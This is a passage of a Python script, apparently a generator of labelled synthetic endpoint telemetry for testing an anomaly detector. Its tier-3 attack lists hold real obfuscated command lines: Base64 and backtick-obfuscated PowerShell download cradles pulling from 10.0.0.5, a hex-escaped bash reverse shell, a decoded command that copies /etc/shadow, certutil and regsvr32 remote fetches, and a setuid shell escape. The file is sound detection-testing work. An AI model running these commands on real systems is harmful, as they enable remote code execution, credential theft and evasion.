                            "user": "CORP\\attacker",
                            "uid": 1000,
                            "gid": 1000,
                            "euid": 0 if integ == "High" else 1000,
                            "integrity_level": integ,
                            "file_touches": touches,
                            "label": "malicious",
                            "tier": 2,
                            "technique": f"Chained Sequence: {tech}",
                            "mitre_technique_id": mitre,
                            "raw_event": raw
                        })

        return events

    def generate_tier3_attacks(self):
        """
        Tier 3: Obfuscated / Stealthy invocations.
        Contains:
          1. Detectable obfuscations: Base64, backticks, hex escapes (~70% of tier).
          2. Subtle low-entropy obfuscations: Short env-var substitution, flag reordering,
             benign-looking script wrappers that blend into normal entropy and command length (~30% of tier).
        Expected Recall: ~0.68 - 0.76 (SLR 2026: Isolation Forest degrades on subtle evasion).
        """
        events = []

        # 7 Detectable Obfuscated Attacks (Moderate to High Anomaly Features)
        detectable_obfuscations = [
            ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\cmd.exe",
             "powershell.exe -e JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiaAB0AHQAcAA6AC8ALwAxADAALgAwAC4AMAAuADUALwBhACIALAAiAEMAOgBcAFQAZQBtAHAAXAB4AC4AZQB4AGUAIgApAA==",
             "windows", "High", ["C:\\Temp\\x.exe"], "Obfuscated Base64 PowerShell Download", "T1059.001"),

            ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\cmd.exe",
             "p`o`w`e`r`s`h`e`l`l.e`x`e -NoP -NonI -W 1 -c \"$b=$env:TEMP+'\\r.exe';(new-object System.Net.WebClient).DownloadFile($env:URL,$b);& $b\"",
             "windows", "High", ["C:\\Temp\\r.exe"], "PowerShell Backtick Obfuscation", "T1059.001"),

            ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\cmd.exe",
             "powershell.exe -c \"& (('{2}{0}{1}'-f'wnload','String','IEX (New-Object Net.WebClient).Do')+'(''http://10.0.0.5/rev''))\"",
             "windows", "High", [], "PowerShell String Concatenation Obfuscation", "T1059.001"),

            ("bash", "/usr/bin/bash", "/usr/bin/bash",
             "bash -c \"$(printf '\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\\x20\\x2d\\x69\\x20\\x3e\\x26\\x20\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f\\x31\\x30\\x2e\\x30\\x2e\\x30\\x2e\\x35\\x2f\\x34\\x34\\x34\\x34')\"",
             "linux", 0, [], "Bash Hex Escaped Reverse Shell", "T1059.004"),

            ("sh", "/bin/sh", "/usr/bin/bash",
             "echo L2Jpbi9iYXNoIC1jICJpZDsgY2F0IC9ldGMvc2hhZG93ID4gL3RtcC9zIiA= | base64 -d | sh",
             "linux", 0, ["/etc/shadow", "/tmp/s"], "Base64 Piped Shell PrivEsc Execution", "T1059.004"),

            ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\cmd.exe",
             "\"rundll32.exe\" \"C:\\Users\\Public\\..\\Windows\\Temp\\update.dll\",#1",
             "windows", "High", ["C:\\Windows\\Temp\\update.dll"], "Rundll32 Ordinal Obfuscation", "T1218.011"),

            ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "C:\\Windows\\System32\\cmd.exe",
             "rEgSvR32.ExE /s /n /u /i:\"h\"\"t\"\"t\"\"p\"://10.0.0.5/test.sct scrobj.dll",
             "windows", "High", [], "Regsvr32 Quote and Case Obfuscation", "T1218.010")
        ]

        # 3 Subtle Low-Entropy Obfuscated Attacks (Blends into Normal Entropy/Lengths)
        # These represent evasion attempts that evade Isolation Forest random partitioning (SLR 2026).
        subtle_obfuscations = [
            # Short cmd environment variable substitution for LOLBin execution
            ("cmd.exe", "C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\explorer.exe",
             "cmd.exe /c \"set p=certutil&& call %p% -dump ca.crt\"",
             "windows", "Medium", [], "Subtle Env-Var LOLBin Aliasing", "T1105"),

            # Reordered flags on LOLBin without high privilege or high entropy
            ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\System32\\cmd.exe",
             "certutil.exe /f /split /urlcache http://10.0.0.5/favicon.ico C:\\Temp\\favicon.ico",
             "windows", "Medium", ["C:\\Temp\\favicon.ico"], "Reordered Slash Flag LOLBin Ingress", "T1105"),

            # Benign-looking wrapper script call for shell escape
            ("sh", "/bin/sh", "/usr/bin/bash",
             "sh -c \"exec /bin/sh -p\"",
             "linux", 1000, [], "Subtle Exec Shell Wrapper", "T1548.001"),
        ]

        # Generate 15 iterations: 7 detectable * 15 = 105; 3 subtle * 15 = 45 -> Total = 150 events
        for _ in range(15):
            for proc, exe, p_exe, cmdline, os_type, priv_level, touches, tech, mitre in detectable_obfuscations:
                pid = random.randint(1000, 65000)
                ppid = random.randint(1000, 65000)
                ts = self._next_timestamp(12)
                sess = f"session_t3_det_{random.randint(1000, 9999)}"

                if os_type == "linux":
                    raw = build_raw_auditd_record(pid, ppid, 1000, priv_level, proc, exe, cmdline)
                    events.append({
                        "event_id": str(uuid.uuid4()),
                        "timestamp": ts,
                        "source": "auditd",
                        "os_type": "linux",
                        "host": "srv-linux-prod01",
                        "session_id": sess,
                        "process_name": proc,
                        "process_path": exe,
                        "process_id": pid,
                        "parent_process_name": os.path.basename(p_exe),
                        "parent_process_path": p_exe,
                        "parent_process_id": ppid,
                        "command_line": cmdline,
                        "user": "ubuntu" if priv_level != 0 else "root",
                        "uid": 1000,
                        "gid": 1000,
                        "euid": priv_level,
                        "integrity_level": "None",
                        "file_touches": touches,
                        "label": "malicious",
                        "tier": 3,
                        "technique": tech,
                        "mitre_technique_id": mitre,
                        "raw_event": raw
                    })
                else:
                    raw = build_raw_sysmon_record(ts, pid, ppid, "CORP\\attacker", exe, p_exe, cmdline, integrity=priv_level)
                    events.append({
                        "event_id": str(uuid.uuid4()),
                        "timestamp": ts,
                        "source": "sysmon",
                        "os_type": "windows",
                        "host": "WIN-EDR-LAB01",
                        "session_id": sess,
                        "process_name": proc,
                        "process_path": exe,
                        "process_id": pid,
                        "parent_process_name": os.path.basename(p_exe),
                        "parent_process_path": p_exe,
                        "parent_process_id": ppid,
                        "command_line": cmdline,
                        "user": "CORP\\attacker",
                        "uid": 1000,
                        "gid": 1000,
                        "euid": 0 if priv_level == "High" else 1000,
                        "integrity_level": priv_level,
                        "file_touches": touches,
                        "label": "malicious",
                        "tier": 3,
                        "technique": tech,
                        "mitre_technique_id": mitre,
                        "raw_event": raw
                    })

            for proc, exe, p_exe, cmdline, os_type, priv_level, touches, tech, mitre in subtle_obfuscations:
                pid = random.randint(1000, 65000)
                ppid = random.randint(1000, 65000)
                ts = self._next_timestamp(12)
                sess = f"session_t3_subtle_{random.randint(1000, 9999)}"

                if os_type == "linux":
                    raw = build_raw_auditd_record(pid, ppid, 1000, priv_level, proc, exe, cmdline)
                    events.append({
                        "event_id": str(uuid.uuid4()),
                        "timestamp": ts,
                        "source": "auditd",
                        "os_type": "linux",
                        "host": "srv-linux-prod01",
                        "session_id": sess,
                        "process_name": proc,
                        "process_path": exe,
                        "process_id": pid,
                        "parent_process_name": os.path.basename(p_exe),
                        "parent_process_path": p_exe,
                        "parent_process_id": ppid,
                        "command_line": cmdline,
                        "user": "ubuntu",
                        "uid": 1000,
                        "gid": 1000,
                        "euid": priv_level,
                        "integrity_level": "None",
                        "file_touches": touches,
                        "label": "malicious",
                        "tier": 3,
                        "technique": tech,
                        "mitre_technique_id": mitre,
                        "raw_event": raw
                    })
                else:
                    raw = build_raw_sysmon_record(ts, pid, ppid, "CORP\\attacker", exe, p_exe, cmdline, integrity=priv_level)
                    events.append({
                        "event_id": str(uuid.uuid4()),
                        "timestamp": ts,
                        "source": "sysmon",
                        "os_type": "windows",
                        "host": "WIN-EDR-LAB01",
                        "session_id": sess,
                        "process_name": proc,
                        "process_path": exe,
                        "process_id": pid,
                        "parent_process_name": os.path.basename(p_exe),
                        "parent_process_path": p_exe,
                        "parent_process_id": ppid,
                        "command_line": cmdline,
                        "user": "CORP\\attacker",
                        "uid": 1000,
                        "gid": 1000,
                        "euid": 1000,
                        "integrity_level": priv_level,
                        "file_touches": touches,
                        "label": "malicious",
                        "tier": 3,
                        "technique": tech,
                        "mitre_technique_id": mitre,
                        "raw_event": raw
                    })

        return events

    def generate_all(self, output_dir="data"):
        os.makedirs(output_dir, exist_ok=True)

        print("[*] Generating Benign Baseline Telemetry...")
        benign_events = []
        for i in range(60):
            session_id_lin = f"session_benign_lin_{i:03d}"
            for _ in range(random.randint(12, 16)):
                benign_events.append(self.generate_benign_linux_event(session_id_lin))

            session_id_win = f"session_benign_win_{i:03d}"
            for _ in range(random.randint(12, 16)):
                benign_events.append(self.generate_benign_windows_event(session_id_win))

        print(f"    Total Benign Baseline Events: {len(benign_events)}")

        print("[*] Generating Attack Tier 1 (Overt / Isolated) Telemetry...")
        t1_events = self.generate_tier1_attacks()
        print(f"    Total Tier 1 Events: {len(t1_events)}")

        print("[*] Generating Attack Tier 2 (Chained Command Sequences) Telemetry...")
        t2_events = self.generate_tier2_attacks()
        print(f"    Total Tier 2 Events: {len(t2_events)}")

        print("[*] Generating Attack Tier 3 (Obfuscated / Stealthy) Telemetry...")
        t3_events = self.generate_tier3_attacks()
        print(f"    Total Tier 3 Events: {len(t3_events)}")

        full_dataset = benign_events + t1_events + t2_events + t3_events
        full_dataset.sort(key=lambda x: x["timestamp"])

        files = {
            "benign_telemetry.json": benign_events,
            "attack_tier1.json": t1_events,
            "attack_tier2.json": t2_events,
            "attack_tier3.json": t3_events,
            "full_evaluation_dataset.json": full_dataset
        }

        for fname, data in files.items():
            path = os.path.join(output_dir, fname)
            with open(path, "w") as f:
                json.dump(data, f, indent=2)
            print(f"[+] Wrote {len(data)} records to {path}")

        return files

if __name__ == "__main__":
    out_dir = sys.argv[1] if len(sys.argv) > 1 else "data"
    generator = TelemetryGenerator()
    generator.generate_all(out_dir)
